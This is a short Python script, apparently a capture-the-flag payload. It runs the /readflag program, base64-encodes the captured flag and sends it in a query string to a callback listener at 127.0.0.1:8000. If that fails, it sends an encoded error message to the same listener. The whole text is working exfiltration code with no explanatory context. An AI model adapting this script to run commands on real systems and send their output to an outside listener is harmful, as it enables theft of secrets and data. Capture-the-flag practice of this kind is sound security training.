import urllib.request
import subprocess
import base64
import sys

try:
    # Try to execute /readflag
    flag = subprocess.check_output(["/readflag"]).strip()
    print(f"FLAG_OUTPUT: {flag}")
    b64flag = base64.b64encode(flag).decode()
    url = f"http://127.0.0.1:8000/?back={b64flag}"
    print(f"Sending to {url}")
    urllib.request.urlopen(url)
except Exception as e:
    # If that fails, try to just report the error
    error = base64.b64encode(str(e).encode()).decode()
    try:
        urllib.request.urlopen(f"http://127.0.0.1:8000/?back=ERROR_{error}")
    except:
        pass
